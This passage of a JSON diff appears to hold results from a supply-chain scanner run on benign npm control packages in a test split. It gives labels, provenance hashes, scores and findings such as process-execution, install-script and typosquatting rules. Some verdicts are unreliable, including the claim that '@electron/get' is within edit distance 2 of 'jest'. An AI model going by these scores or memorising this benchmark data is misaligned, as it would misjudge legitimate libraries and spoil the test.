+      "id": "opentelemetry-sdk-node-0.57.2",
+      "name": "@opentelemetry/sdk-node",
+      "version": "0.57.2",
+      "label": "benign",
+      "family": "fresh-benign-opentelemetry-node-instrumentation",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/@opentelemetry/sdk-node/-/sdk-node-0.57.2.tgz",
+        "labelEvidence": "https://opentelemetry.io/docs/languages/js/getting-started/nodejs/ — Official Node observability SDK; legitimate instrumentation and telemetry initialization with configurable exporters. Provisional benign challenge control.",
+        "capturedAt": "2026-11-12T09:19:00.703Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "17bccaa88a7c280e1589e0393f1bb0ce8d6860999b98ff833f090f4442cbaf43",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 1.1503999999999905,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "@opentelemetry/sdk-node",
+        "version": "0.57.2",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 23323,
+          "unpackedBytes": 99630,
+          "filesScanned": 11,
+          "filesSkipped": 7,
+          "integrityVerified": true,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:24.304Z"
+      },
+      "wallDurationMs": 6.662900000000036
+    },
+    {
+      "id": "nodemailer-6.10.1",
+      "name": "nodemailer",
+      "version": "6.10.1",
+      "label": "benign",
+      "family": "fresh-benign-mail-transport",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/nodemailer/-/nodemailer-6.10.1.tgz",
+        "labelEvidence": "https://nodemailer.com/ — Established mail library; legitimate SMTP authentication, DKIM signing, attachments and Sendmail transport. Provisional benign challenge control.",
+        "capturedAt": "2026-11-12T09:19:01.811Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "67a21411676841980eafa274306d91c112410779f56edb0262eb8dbd1fa3e6b7",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 0.3362000000001899,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "nodemailer",
+        "version": "6.10.1",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "scannedAt": "2026-11-12T09:20:24.309Z"
+      },
+      "wallDurationMs": 4.723500000000058
+    },
+    {
+      "id": "nodemailer-6.10.1",
+      "name": "nodemailer",
+      "version": "6.10.1",
+      "label": "benign",
+      "family": "fresh-benign-mail-transport",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/nodemailer/-/nodemailer-6.10.1.tgz",
+        "labelEvidence": "https://nodemailer.com/ — Established mail library; legitimate SMTP authentication, DKIM signing, attachments and Sendmail transport. Provisional benign challenge control.",
+        "capturedAt": "2026-11-12T09:19:01.811Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "67a21411676841980eafa274306d91c112410779f56edb0262eb8dbd1fa3e6b7",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 29.248299999999972,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 92,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "nodemailer",
+        "version": "6.10.1",
+        "overallLevel": "safe",
+        "score": 92,
+        "findings": [
+          {
+            "ruleId": "content-process-exec",
+            "ruleName": "Process execution capability",
+            "severity": "medium",
+            "message": "Published runtime source can execute child processes: package/lib/sendmail-transport/index.js.",
+            "filePath": "package/lib/sendmail-transport/index.js",
+            "lineNumber": 3,
+            "recommendation": "Confirm process execution is necessary and arguments cannot be influenced by untrusted input.",
+            "category": "suspicious-dependency"
+          }
+        ],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 115207,
+          "unpackedBytes": 507785,
+          "filesScanned": 37,
+          "filesSkipped": 6,
+          "integrityVerified": true,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:24.343Z"
+      },
+      "wallDurationMs": 34.321500000000015
+    },
+    {
+      "id": "electron-get-3.1.0",
+      "name": "@electron/get",
+      "version": "3.1.0",
+      "label": "benign",
+      "family": "fresh-benign-electron-downloader",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/@electron/get/-/get-3.1.0.tgz",
+        "labelEvidence": "https://github.com/electron/get — Electron-maintained release-artifact downloader; legitimate network downloads, cache/filesystem access and checksum verification. Provisional benign challenge control.",
+        "capturedAt": "2026-11-12T09:19:02.256Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "dd6f2981942bccef59a913bd8c3bd638405b505483de3ff8e53084097ebe14c3",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 0.23550000000000182,
+      "stage": "scan",
+      "overallLevel": "suspicious",
+      "score": 85,
+      "highCriticalAlert": true,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "@electron/get",
+        "version": "3.1.0",
+        "overallLevel": "suspicious",
+        "score": 85,
+        "findings": [
+          {
+            "ruleId": "typosquatting",
+            "ruleName": "Typosquatting candidate",
+            "severity": "high",
+            "message": "Package name \"@electron/get\" is within edit distance 2 of popular package \"jest\".",
+            "recommendation": "Verify this is the intended package and not a typosquat of \"jest\".",
+            "category": "typosquatting"
+          }
+        ],
+        "scannedAt": "2026-11-12T09:20:24.348Z"
+      },
+      "wallDurationMs": 4.706300000000056
+    },
+    {
+      "id": "electron-get-3.1.0",
+      "name": "@electron/get",
+      "version": "3.1.0",
+      "label": "benign",
+      "family": "fresh-benign-electron-downloader",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/@electron/get/-/get-3.1.0.tgz",
+        "labelEvidence": "https://github.com/electron/get — Electron-maintained release-artifact downloader; legitimate network downloads, cache/filesystem access and checksum verification. Provisional benign challenge control.",
+        "capturedAt": "2026-11-12T09:19:02.256Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "dd6f2981942bccef59a913bd8c3bd638405b505483de3ff8e53084097ebe14c3",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 2.588700000000017,
+      "stage": "scan",
+      "overallLevel": "suspicious",
+      "score": 77,
+      "highCriticalAlert": true,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "@electron/get",
+        "version": "3.1.0",
+        "overallLevel": "suspicious",
+        "score": 77,
+        "findings": [
+          {
+            "ruleId": "typosquatting",
+            "ruleName": "Typosquatting candidate",
+            "severity": "high",
+            "message": "Package name \"@electron/get\" is within edit distance 2 of popular package \"jest\".",
+            "recommendation": "Verify this is the intended package and not a typosquat of \"jest\".",
+            "category": "typosquatting"
+          },
+          {
+            "ruleId": "content-process-exec",
+            "ruleName": "Process execution capability",
+            "severity": "medium",
+            "message": "Published runtime source can execute child processes: package/dist/cjs/utils.js.",
+            "filePath": "package/dist/cjs/utils.js",
+            "lineNumber": 4,
+            "recommendation": "Confirm process execution is necessary and arguments cannot be influenced by untrusted input.",
+            "category": "suspicious-dependency"
+          }
+        ],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 22554,
+          "unpackedBytes": 125656,
+          "filesScanned": 37,
+          "filesSkipped": 20,
+          "integrityVerified": true,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:24.356Z"
+      },
+      "wallDurationMs": 7.7590999999999894
+    },
+    {
+      "id": "sharp-0.34.1",
+      "name": "sharp",
+      "version": "0.34.1",
+      "label": "benign",
+      "family": "fresh-benign-native-image-library",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/sharp/-/sharp-0.34.1.tgz",
+        "labelEvidence": "https://sharp.pixelplumbing.com/ — Official native image-processing package; legitimate native dependency and platform/build selection logic. Provisional benign challenge control; ordinary vulnerabilities are outside this label.",
+        "capturedAt": "2026-11-12T09:19:02.745Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "451ce1ef17ab971fbc61fecc4b44b0f25b26128d1b61a5c02cd42b9f77072df6",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 0.17190000000005057,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 92,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "sharp",
+        "version": "0.34.1",
+        "overallLevel": "safe",
+        "score": 92,
+        "findings": [
+          {
+            "ruleId": "install-script",
+            "ruleName": "Suspicious install script",
+            "severity": "medium",
+            "message": "Lifecycle script \"install\" runs automatically during package installation.",
+            "recommendation": "Inspect the script before installation and prefer packages without install-time execution.",
+            "category": "install-script"
+          }
+        ],
+        "scannedAt": "2026-11-12T09:20:24.360Z"
+      },
+      "wallDurationMs": 3.7455999999999676
+    },
+    {
+      "id": "sharp-0.34.1",
+      "name": "sharp",
+      "version": "0.34.1",
+      "label": "benign",
+      "family": "fresh-benign-native-image-library",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/sharp/-/sharp-0.34.1.tgz",
+        "labelEvidence": "https://sharp.pixelplumbing.com/ — Official native image-processing package; legitimate native dependency and platform/build selection logic. Provisional benign challenge control; ordinary vulnerabilities are outside this label.",
+        "capturedAt": "2026-11-12T09:19:02.745Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "451ce1ef17ab971fbc61fecc4b44b0f25b26128d1b61a5c02cd42b9f77072df6",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 8.981999999999971,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 84,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "sharp",
+        "version": "0.34.1",
+        "overallLevel": "safe",
+        "score": 84,
+        "findings": [
+          {
+            "ruleId": "install-script",
+            "ruleName": "Suspicious install script",
+            "severity": "medium",
+            "message": "Lifecycle script \"install\" runs automatically during package installation.",
+            "recommendation": "Inspect the script before installation and prefer packages without install-time execution.",
+            "category": "install-script"
+          },
+          {
+            "ruleId": "content-process-exec",
+            "ruleName": "Process execution capability",
+            "severity": "medium",
+            "message": "Published runtime source can execute child processes: package/lib/libvips.js.",
+            "filePath": "package/lib/libvips.js",
+            "lineNumber": 6,
+            "recommendation": "Confirm process execution is necessary and arguments cannot be influenced by untrusted input.",
+            "category": "suspicious-dependency"
+          }
+        ],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 117267,
+          "unpackedBytes": 522192,
+          "filesScanned": 17,
+          "filesSkipped": 15,
+          "integrityVerified": true,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:24.374Z"
+      },
+      "wallDurationMs": 14.226900000000114
+    },
+    {
+      "id": "webpack-5.99.8",
+      "name": "webpack",
+      "version": "5.99.8",
+      "label": "benign",
+      "family": "fresh-benign-build-tool",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/webpack/-/webpack-5.99.8.tgz",
+        "labelEvidence": "https://webpack.js.org/ — Official bundler; legitimate generated JavaScript, dynamic module-loading forms and compiler infrastructure. Provisional benign challenge control.",
+        "capturedAt": "2026-11-12T09:19:03.162Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "efb908acd68c3d4fa997491275185857eb557e1228cbd6ee335dc9d1514ad930",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 3.6206999999999425,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "webpack",
+        "version": "5.99.8",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "scannedAt": "2026-11-12T09:20:24.382Z"
+      },
+      "wallDurationMs": 8.054799999999886
+    },
+    {
+      "id": "webpack-5.99.8",
+      "name": "webpack",
+      "version": "5.99.8",
+      "label": "benign",
+      "family": "fresh-benign-build-tool",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/webpack/-/webpack-5.99.8.tgz",
+        "labelEvidence": "https://webpack.js.org/ — Official bundler; legitimate generated JavaScript, dynamic module-loading forms and compiler infrastructure. Provisional benign challenge control.",
+        "capturedAt": "2026-11-12T09:19:03.162Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "efb908acd68c3d4fa997491275185857eb557e1228cbd6ee335dc9d1514ad930",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 342.17949999999996,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 92,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "webpack",
+        "version": "5.99.8",
+        "overallLevel": "safe",
+        "score": 92,
+        "findings": [
+          {
+            "ruleId": "content-process-exec",
+            "ruleName": "Process execution capability",
+            "severity": "medium",
+            "message": "Published runtime source can execute child processes: package/bin/webpack.js.",
+            "filePath": "package/bin/webpack.js",
+            "lineNumber": 9,
+            "recommendation": "Confirm process execution is necessary and arguments cannot be influenced by untrusted input.",
+            "category": "suspicious-dependency"
+          }
+        ],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 1037387,
+          "unpackedBytes": 5329675,
+          "filesScanned": 688,
+          "filesSkipped": 3,
+          "integrityVerified": true,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:24.730Z"
+      },
+      "wallDurationMs": 348.2183
+    },
+    {
+      "id": "ethers-6.13.5",
+      "name": "ethers",
+      "version": "6.13.5",
+      "label": "benign",
+      "family": "fresh-benign-ethereum-wallet-sdk",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/ethers/-/ethers-6.13.5.tgz",
+        "labelEvidence": "https://docs.ethers.org/v6/ — Official Ethereum library; legitimate local keys, mnemonic handling, signatures and RPC transport. Provisional benign challenge control for private-material flow rules.",
+        "capturedAt": "2026-11-12T09:19:03.918Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "9a397392e166a58c36e055927cfd831eebc37d680d2598eedd884622f78d2b56",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 0.36799999999993815,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "ethers",
+        "version": "6.13.5",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "scannedAt": "2026-11-12T09:20:24.738Z"
+      },
+      "wallDurationMs": 7.773400000000038
+    },
+    {
+      "id": "ethers-6.13.5",
+      "name": "ethers",
+      "version": "6.13.5",
+      "label": "benign",
+      "family": "fresh-benign-ethereum-wallet-sdk",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/ethers/-/ethers-6.13.5.tgz",
+        "labelEvidence": "https://docs.ethers.org/v6/ — Official Ethereum library; legitimate local keys, mnemonic handling, signatures and RPC transport. Provisional benign challenge control for private-material flow rules.",
+        "capturedAt": "2026-11-12T09:19:03.918Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "9a397392e166a58c36e055927cfd831eebc37d680d2598eedd884622f78d2b56",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 677.8817000000001,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "ethers",
+        "version": "6.13.5",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 2636057,
+          "unpackedBytes": 12625472,
+          "filesScanned": 707,
+          "filesSkipped": 567,
+          "integrityVerified": true,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:25.423Z"
+      },
+      "wallDurationMs": 685.0949999999998
+    },
+    {
+      "id": "tweetnacl-1.0.3",
+      "name": "tweetnacl",
+      "version": "1.0.3",
+      "label": "benign",
+      "family": "fresh-benign-crypto-primitives",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/tweetnacl/-/tweetnacl-1.0.3.tgz",
+        "labelEvidence": "https://tweetnacl.js.org/ — Established cryptographic primitive library; legitimate secret/public keys, encryption, hashing and signatures. Provisional benign control.",
+        "capturedAt": "2026-11-12T09:19:04.646Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "2bac23c1590d5ad5cbadea7016fa882cc059bcbf57e2d8b0c41c2def0feda049",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 0.42610000000013315,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "tweetnacl",
+        "version": "1.0.3",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "scannedAt": "2026-11-12T09:20:25.432Z"
+      },
+      "wallDurationMs": 9.306099999999788
+    },
+    {
+      "id": "tweetnacl-1.0.3",
+      "name": "tweetnacl",
+      "version": "1.0.3",
+      "label": "benign",
+      "family": "fresh-benign-crypto-primitives",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/tweetnacl/-/tweetnacl-1.0.3.tgz",
+        "labelEvidence": "https://tweetnacl.js.org/ — Established cryptographic primitive library; legitimate secret/public keys, encryption, hashing and signatures. Provisional benign control.",
+        "capturedAt": "2026-11-12T09:19:04.646Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "2bac23c1590d5ad5cbadea7016fa882cc059bcbf57e2d8b0c41c2def0feda049",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 16.95069999999987,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "tweetnacl",
+        "version": "1.0.3",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 49790,
+          "unpackedBytes": 174912,
+          "filesScanned": 6,
+          "filesSkipped": 5,
+          "integrityVerified": true,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:25.456Z"
+      },
+      "wallDurationMs": 23.535100000000057
+    },
+    {
+      "id": "jsonwebtoken-9.0.2",
+      "name": "jsonwebtoken",
+      "version": "9.0.2",
+      "label": "benign",
+      "family": "fresh-benign-jwt-authentication",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/jsonwebtoken/-/jsonwebtoken-9.0.2.tgz",
+        "labelEvidence": "https://github.com/auth0/node-jsonwebtoken — Auth0 JWT implementation; legitimate symmetric/asymmetric signing, verification and key material. Provisional benign control.",
+        "capturedAt": "2026-11-12T09:19:05.024Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "d0e8ffa8ab2f2042cdd8dda22af60a49ab287abc56e237b2ca75c4e6d395509e",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 1.1768999999999323,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "jsonwebtoken",
+        "version": "9.0.2",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "scannedAt": "2026-11-12T09:20:25.461Z"
+      },
+      "wallDurationMs": 5.107400000000325
+    },
+    {
+      "id": "jsonwebtoken-9.0.2",
+      "name": "jsonwebtoken",
+      "version": "9.0.2",
+      "label": "benign",
+      "family": "fresh-benign-jwt-authentication",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/jsonwebtoken/-/jsonwebtoken-9.0.2.tgz",
+        "labelEvidence": "https://github.com/auth0/node-jsonwebtoken — Auth0 JWT implementation; legitimate symmetric/asymmetric signing, verification and key material. Provisional benign control.",
+        "capturedAt": "2026-11-12T09:19:05.024Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "d0e8ffa8ab2f2042cdd8dda22af60a49ab287abc56e237b2ca75c4e6d395509e",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 2.467200000000048,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "jsonwebtoken",
+        "version": "9.0.2",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 12231,
+          "unpackedBytes": 43482,
+          "filesScanned": 13,
+          "filesSkipped": 2,
+          "integrityVerified": true,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:25.468Z"
+      },
+      "wallDurationMs": 7.184799999999996
+    },
+    {
+      "id": "dotenv-16.5.0",
+      "name": "dotenv",
+      "version": "16.5.0",
+      "label": "benign",
+      "family": "fresh-benign-environment-loader",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/dotenv/-/dotenv-16.5.0.tgz",
+        "labelEvidence": "https://github.com/motdotla/dotenv — Established environment loader; legitimate local environment-file parsing and process environment access. Provisional benign control.",
+        "capturedAt": "2026-11-12T09:19:05.393Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "2ad413a17c0f09d2ddd6be6cc4517eb20f099ce054e0ac80b889ec476abac57f",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 0.3739999999997963,
+      "stage": "scan",
+      "overallLevel": "dangerous",
+      "score": 75,
+      "highCriticalAlert": true,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "dotenv",
+        "version": "16.5.0",
+        "overallLevel": "dangerous",
+        "score": 75,
+        "findings": [
+          {
+            "ruleId": "secret-exposure",
